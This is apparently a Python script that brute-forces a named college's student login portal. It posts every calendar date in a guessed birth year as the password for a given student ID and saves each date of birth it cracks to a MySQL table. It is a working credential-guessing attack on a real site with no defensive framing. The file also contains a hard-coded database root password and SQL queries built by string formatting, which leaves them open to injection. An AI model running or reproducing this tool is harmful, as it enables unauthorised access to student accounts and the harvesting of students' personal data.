import requests
import mysql.connector


mycon = mysql.connector.connect(host="localhost", passwd="rootmysql",user="root")
mysql_cursor = mycon.cursor()

mysql_cursor.execute('CREATE DATABASE IF NOT EXISTS kcg')
mysql_cursor.execute('USE kcg')


query_create_table = 'CREATE TABLE dobs(id varchar(13) primary key, dob varchar(8) not null)'

student_login_url = 'http://studentlogin.kcgcollege.ac.in/'

try:
    mysql_cursor.execute(query_create_table)
except:
    pass
payload = {
    '__EVENTTARGET' : '' ,
    '__EVENTARGUMENT' : '',
    '__LASTFOCUS' : '',
    '__VIEWSTATE' : '/wEPDwUJMjkwMTA2NTY5D2QWAgIDD2QWCgIDDxAPFgYeDURhdGFUZXh0RmllbGQFCGNvbGxuYW1lHg5EYXRhVmFsdWVGaWVsZAUMY29sbGVnZV9jb2RlHgtfIURhdGFCb3VuZGdkEBUBGUtDRyBDb2xsZWdlIG9mIFRlY2hub2xvZ3kVAQIxMxQrAwFnFgFmZAIFDxBkEBUCC1JvbGwgTnVtYmVyEVJlZ2lzdGVyZWQgTnVtYmVyFQIBMAExFCsDAmdnFgFmZAIHDw9kFgQeC3BsYWNlaG9sZGVyBQtSb2xsIE51bWJlch4MYXV0b2NvbXBsZXRlBQNvZmZkAgsPD2QWAh8EBQNvZmZkAg8PDxYCHgdWaXNpYmxlaGRkZEUh8Q9VeEnmpvJTjWVIwQmtVpX5IBYcjkAZZqWYNv5m', 
    '__VIEWSTATEGENERATOR' : 'CA0B0334',
    '__EVENTVALIDATION' : '/wEdAAfEhVpMiIC9PlqrGxNesSta1ewWtm3evXPJ0S9N/1pup/olUdBTEtKbUYVn9qLUVnP36l7NJf9XLe0xTP1byily7ATayzSAKKfWGUr2Dqcb+ZxpWckI3qdmfEJVCu2f5cHN+DvxnwFeFeJ9MIBWR6935FJfAFbS62yyYTlq6hIkdlrWUyRFAO0MmBe4dmPHJe8=',
    'rblOnlineAppLoginMode' : '0',
    'txtuname' : None,
    'txtpassword' : None,
    'Button1' : 'Login'
}

time_out_dates = [] 

def get_years(u_id, reg_no_):
    if reg_no_:       
        year = 2000 + int(u_id[4:6]) #year from register number                   
    else:            
        year = 2000 + int(u_id[:2])  #year from roll number  
            
    yob = year - 18
    years = (str(yob), str(yob + 1), str(yob - 1))
    return years  

def check_date(The_day_):
    payload['txtpassword'] = The_day_
                
    try:
        page = requests.post(student_login_url, data = payload, timeout = 10)
        #print(The_day_)
    except:
        #print('timed out', The_day_)
        time_out_dates.append(The_day_)               
        

    #print(page.url)
    if page.url != student_login_url: 
        #print('dob found 1')        
        #print(The_day)  
        #print('dob found 2')             
        return True
    
    return False 


def find_student_dob(user_id, year_of_birth = None):
    mysql_cursor.execute("select * from dobs where id = '{}'".format(user_id))
    data = mysql_cursor.fetchall()
    
    if data != []:
        return data[0][1]
    else:
        reg_no_ = False

        if user_id[:4] == '3110' :
            payload['rblOnlineAppLoginMode'] = '1'
            reg_no_ = True        

        months = {
            '01' : 31, '02' : 29, '03' : 31, '04' : 30,
            '05' : 31, '06' : 30, '07' : 31, '08' : 31,
            '09' : 30, '10' : 31, '11' : 30, '12' : 31,
        }

        payload['txtuname'] = user_id
        The_day = None
    
        if year_of_birth == None:
            years = get_years(user_id, reg_no_)
        else:
            years = (year_of_birth,)         

        for str_yob in years:
            for str_month in ('01','02','03','04','05','06','07','08','09','10','11','12'):
                days = months[str_month]

                for day in range(1,days + 1):
                    str_day = str(day)
                    if len(str_day) == 1:
                        str_day = '0' + str_day

                    The_day = str_day + str_month + str_yob
                    
                    if check_date(The_day):
                        #print('dob found 3')
                        mysql_cursor.execute("INSERT INTO dobs VALUES('{}','{}')".format(user_id,The_day))
                        mysql_cursor.execute('commit')
                        #print('dob found 4')
                        return The_day

        for date_ in time_out_dates:
            if check_date(date_):
                mysql_cursor.execute("INSERT INTO dobs VALUES('{}','{}')".format(user_id,The_day))
                mysql_cursor.execute('commit')
                return date_

                    
        
    raise Exception   

#find_student_dob('311020104004', '2003')                        
            



